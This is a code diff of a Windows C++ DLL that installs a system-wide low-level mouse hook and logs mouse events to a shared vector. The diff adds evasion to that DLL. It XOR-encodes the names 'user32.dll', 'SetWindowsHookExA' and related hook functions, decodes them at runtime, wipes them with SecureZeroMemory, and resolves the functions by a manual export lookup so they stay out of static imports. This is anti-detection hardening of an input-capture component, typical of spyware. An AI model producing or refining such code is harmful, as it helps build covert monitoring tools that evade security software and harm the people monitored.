@@ -5,7 +5,10 @@
 #include <vector>
 #include <sstream>
 #define DLL_EXPORT __declspec(dllexport)
+#define X_C(c) static_cast<char>((c) ^ 0xFF)
+
 ///////////////////////////////////////////////////////////////////////
+HMODULE hUser32;
 HHOOK m_hook;
 std::vector<std::string>* sharedLogVector = nullptr;
 std::mutex logMutex;
@@ -13,13 +16,13 @@ std::mutex logMutex;
 LRESULT CALLBACK M_Proc(int nCode, WPARAM wParam, LPARAM lParam);
 ///////////////////////////////////////////////////////////////////////
 
-typedef HHOOK(WINAPI *SetWinHookFn)(int, HOOKPROC, HINSTANCE, DWORD);
-typedef BOOL(WINAPI *UnhookWinHookExFn)(HHOOK);
-typedef LRESULT(WINAPI *CallNxtHookExFn)(HHOOK, int, WPARAM, LPARAM);
+typedef HHOOK(WINAPI *Set_WinHuk_Fn)(int, HOOKPROC, HINSTANCE, DWORD);
+typedef BOOL(WINAPI *Un_huk_WinHuk_ExFn)(HHOOK);
+typedef LRESULT(WINAPI *Call_NxtHuk_ExFn)(HHOOK, int, WPARAM, LPARAM);
 
-SetWinHookFn MySetWindowsHookEx;
-UnhookWinHookExFn MyUnhookWindowsHookEx;
-CallNxtHookExFn MyCallNextHookEx;
+Set_WinHuk_Fn My_Set_WinDows_Huk_ExA;
+Un_huk_WinHuk_ExFn My_Unhuk_WinDows_Huk_Ex;
+Call_NxtHuk_ExFn My_Call_Nxt_Huk_Ex;
 
 ///////////////////////////////////////////////////////////////////////
 
@@ -40,27 +43,48 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
         {
             DWORD funcRVA = funcRVAs[ordRVAs[i]];
             return (void*)((BYTE*)hModule + funcRVA);
-
         }
     }
+    MessageBoxA(NULL, "Failed to find export address" , "Error", MB_OK);
     return nullptr;
 }
 
 DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
 {
 
-    HMODULE hUser32 = (HMODULE)GetModuleHandleA("user32.dll");
-    MySetWindowsHookEx = (SetWinHookFn)FindExportAddress(hUser32, "SetWindowsHookExA");
-    MyUnhookWindowsHookEx = (UnhookWinHookExFn)FindExportAddress(hUser32, "UnhookWindowsHookEx");
-    MyCallNextHookEx = (CallNxtHookExFn)FindExportAddress(hUser32, "CallNextHookEx");
+    char obf_Usr_32[] = { X_C('u'), X_C('s'), X_C('e'), X_C('r'), X_C('3'), X_C('2'), X_C('.'), X_C('d'), X_C('l'), X_C('l'), '\0'};
+    char obf_Set_Win_Huk_ExA[] = { X_C('S'), X_C('e'), X_C('t'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), X_C('A'), '\0' };
+    char obf_Unhuk_Win_Huk_Ex[] = { X_C('U'), X_C('n'), X_C('h'), X_C('o'), X_C('o'), X_C('k'), X_C('W'), X_C('i'), X_C('n'), X_C('d'), X_C('o'), X_C('w'), X_C('s'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };
+    char obf_Cal_NxtHuk_Ex[] = { X_C('C'), X_C('a'), X_C('l'), X_C('l'), X_C('N'), X_C('e'), X_C('x'), X_C('t'), X_C('H'), X_C('o'), X_C('o'), X_C('k'), X_C('E'), X_C('x'), '\0' };
+
+    for (int i = 0; obf_Usr_32[i] != '\0'; i++) obf_Usr_32[i] ^= 0xFF;
+    for (int i = 0; obf_Set_Win_Huk_ExA[i] != '\0'; i++) obf_Set_Win_Huk_ExA[i] ^= 0xFF;
+    for (int i = 0; obf_Unhuk_Win_Huk_Ex[i] != '\0'; i++) obf_Unhuk_Win_Huk_Ex[i] ^= 0xFF;
+    for (int i = 0; obf_Cal_NxtHuk_Ex[i] != '\0'; i++) obf_Cal_NxtHuk_Ex[i] ^= 0xFF;
+
+
+    hUser32 = (HMODULE)LoadLibraryA(obf_Usr_32);
+    My_Set_WinDows_Huk_ExA = (Set_WinHuk_Fn)FindExportAddress(hUser32, obf_Set_Win_Huk_ExA);
+    My_Unhuk_WinDows_Huk_Ex = (Un_huk_WinHuk_ExFn)FindExportAddress(hUser32, obf_Unhuk_Win_Huk_Ex);
+    My_Call_Nxt_Huk_Ex = (Call_NxtHuk_ExFn)FindExportAddress(hUser32, obf_Cal_NxtHuk_Ex);
     
+    SecureZeroMemory(obf_Usr_32, sizeof(obf_Usr_32));
+    SecureZeroMemory(obf_Set_Win_Huk_ExA, sizeof(obf_Set_Win_Huk_ExA));
+    SecureZeroMemory(obf_Unhuk_Win_Huk_Ex, sizeof(obf_Unhuk_Win_Huk_Ex));
+    SecureZeroMemory(obf_Cal_NxtHuk_Ex, sizeof(obf_Cal_NxtHuk_Ex));
+
     sharedLogVector = logVector;
-    m_hook = MySetWindowsHookEx(WH_MOUSE_LL, M_Proc, GetModuleHandle(NULL), 0);
+    m_hook = My_Set_WinDows_Huk_ExA(WH_MOUSE_LL, M_Proc, GetModuleHandle(NULL), 0);
 }
 
 DLL_EXPORT void Cleanup()
 {
-    if (m_hook) MyUnhookWindowsHookEx(m_hook);
+    if (m_hook) 
+    {
+        My_Unhuk_WinDows_Huk_Ex(m_hook);
+        FreeLibrary(hUser32);
+        m_hook = nullptr;
+    }
 }
 
 LRESULT CALLBACK M_Proc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -97,5 +121,5 @@ LRESULT CALLBACK M_Proc(int nCode, WPARAM wParam, LPARAM lParam)
             }
         }
     }
-    return MyCallNextHookEx(m_hook, nCode, wParam, lParam);
+    return My_Call_Nxt_Huk_Ex(m_hook, nCode, wParam, lParam);
 }
